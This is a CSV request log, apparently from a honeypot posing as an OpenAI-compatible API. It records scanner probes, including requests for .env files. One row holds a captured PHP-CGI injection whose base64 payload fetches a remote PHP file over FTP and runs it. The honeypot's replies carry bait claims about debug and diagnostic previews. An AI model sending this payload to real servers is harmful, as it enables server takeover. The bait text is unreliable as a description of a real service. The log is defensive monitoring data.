request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
539f1eea-be95-4a05-a38b-2e44185a412f,2026-05-05T16:34:26.508952+00:00,anon_baa5ecc5,GET,/,[honeypot-host],Go-http-client/1.1,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
c7848059-3e80-426c-ab1d-8eb751dd00e3,2026-05-05T16:49:23.861643+00:00,anon_12eedc11,GET,/level/15/exec/-/sh/run/CR,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",1,
1f591374-8c28-43ef-9f44-9247e6637d1d,2026-05-05T17:01:57.325396+00:00,anon_7007ad76,GET,/,[honeypot-host],"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
f0dd8118-3d63-4e69-810b-eeeb61866e1a,2026-05-05T17:30:53.503182+00:00,anon_f8e113d2,GET,/,[honeypot-host],Go-http-client/1.1,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
0b894224-2bf2-4f7d-8212-410c01980246,2026-05-05T17:39:47.173783+00:00,anon_9e8ec4c5,GET,/index.asp,[honeypot-host],Hello World/1.0,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
40c12c48-93b1-4b16-90c7-2aecbf596d01,2026-05-05T17:58:54.942981+00:00,anon_f334d8af,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d374e5a9-28e4-485b-bea9-bc176ea11468,2026-05-05T18:14:24.841800+00:00,anon_d180a667,GET,/.env,[honeypot-host],"Mozilla/5.0 (Linux; Android 9; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
0e918633-d004-4ea3-a718-7098906ee447,2026-05-05T19:01:00.826699+00:00,anon_df8ecaf5,GET,/developmentserver/metadatauploader,[honeypot-host],Mozilla/5.0 zgrab/0.x,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
3854b8ce-5a13-4b42-966f-e4910a5019a4,2026-05-05T19:05:41.811131+00:00,anon_0f3e10c0,GET,/v1/models,[honeypot-host],axios/1.15.2,,0,671,1,,,,200,OK,"{""object"": ""list"", ""data"": [{""id"": ""gpt-4o"", ""object"": ""model"", ""owned_by"": ""openai-compatible""}, {""id"": ""gpt-4-turbo"", ""object"": ""model"", ""owned_by"": ""openai-compatible""}, {""id"": ""claude-3-opus"", ""object"": ""model"", ""owned_by"": ""anthropic-compatible""}, {""id"": ""llama-3-70b"", ""object"": ""model"", ""owned_by"": ""meta-compatible""}, {""id"": ""qwen-research"", ""object"": ""model"", ""owned_by"": ""open-source""}, {""id"": ""gpt-4o-preview-safe"", ""object"": ""model"", ""owned_by"": ""internal-preview""}, {""id"": ""gpt-4o-mini-tools-preview"", ""object"": ""model"", ""owned_by"": ""internal-preview""}], ""debug"": {""tool_preview"": true, ""system_prompt_export"": false, ""developer_diagnostics_preview"": true}}
",0,
e629677e-7666-4417-9b8a-0c155cbf5c76,2026-05-05T19:47:57.820034+00:00,anon_40bff00c,GET,/,[honeypot-host],curl/7.64.1,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
d40650a3-cbb8-406a-94e0-b559c3ce8aab,2026-05-05T19:47:58.042826+00:00,anon_40bff00c,GET,/,[honeypot-host],curl/7.74.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
d00daee9-3604-4c28-86a5-ac6822ceefa0,2026-05-05T19:48:37.950287+00:00,anon_b51754dd,GET,/,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
00076860-7e6d-4d0a-aa5d-daed350ffc25,2026-05-05T19:48:38.940910+00:00,anon_d8d6c02a,GET,/favicon.ico,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
caa3a8c1-b5a8-4e44-b3bb-a08cd0e9eaac,2026-05-05T19:57:37.390904+00:00,anon_f183389a,GET,/,[honeypot-host],"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
0d4c74ab-d732-45eb-8daf-9d94e3c8687c,2026-05-05T20:02:26.775948+00:00,anon_00b684f0,GET,/,[honeypot-host],Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
9dc065c4-561e-49e6-a212-649f2ca1b5cd,2026-05-05T20:02:27.104447+00:00,anon_00b684f0,GET,/favicon.ico,[honeypot-host],Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
514cf36c-f910-4dcc-b733-718553151e79,2026-05-05T20:07:56.522909+00:00,anon_640de9e1,GET,/,,"Mozilla/5.0 (Linux; Android 9; SM-N950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
0ac13fca-6356-41a1-82ae-871d2678655c,2026-05-05T20:18:46.985441+00:00,anon_6b1bfd13,POST,/php-cgi/php-cgi.exe,[honeypot-host],python-requests/2.33.1,,174,316,1,,<?php phpinfo(); echo eval(base64_decode('ZWNobyAnW1NdJzsgc3lzdGVtKCdjdXJsIC1vIHQzLnBocCBmdHA6Ly9mdHAuaGtvcm8uYmVzdC90My5waHAgJiBwaHAgdDMucGhwJyk7IGVjaG8gJ1tFXSc7')); die()?>,<?php phpinfo(); echo eval(base64_decode('ZWNobyAnW1NdJzsgc3lzdGVtKCdjdXJsIC1vIHQzLnBocCBmdHA6Ly9mdHAuaGtvcm8uYmVzdC90My5waHAgJiBwaHAgdDMucGhwJyk7IGVjaG8gJ1tFXSc7')); die()?>,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f5253ad6-94aa-4365-aa7a-438b4639d626,2026-05-05T20:27:07.157787+00:00,anon_ba7fb874,GET,/,[honeypot-host],Mozilla/1.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
00dd6476-57d7-490e-bf9d-0f37d5039b17,2026-05-05T20:51:41.075209+00:00,anon_2b481238,GET,/,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
89988c16-18f2-44e6-8149-ba0cb3ec36f5,2026-05-05T20:51:43.481315+00:00,anon_2b481238,GET,/favicon.ico,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
0540abf3-0153-4e8a-9568-d0fc21711b7d,2026-05-05T20:52:11.647838+00:00,anon_2b481238,GET,/robots.txt,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
428fa707-c222-4a07-a131-1ed713535ffd,2026-05-05T21:13:00.842081+00:00,anon_3c8beb4e,GET,/,[honeypot-host],"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
62137bc1-e944-47c0-aa26-fb1c4cd1f16f,2026-05-05T21:33:03.898938+00:00,anon_56435c66,GET,/,[honeypot-host],"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
e520eb58-56bf-48fa-be34-67a0a181f001,2026-05-05T21:48:16.224499+00:00,anon_0ccbc08c,GET,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
470a95c4-6f42-4045-86fd-7e15862f7c2d,2026-05-05T21:52:20.026548+00:00,anon_aa874c88,GET,/,[honeypot-host],Mozilla/5.0 zgrab/0.x,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
9ae37c5a-9ce7-4c8d-8450-b91bcd005704,2026-05-05T22:00:01.174116+00:00,anon_cca5ce40,GET,/,[honeypot-host],"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
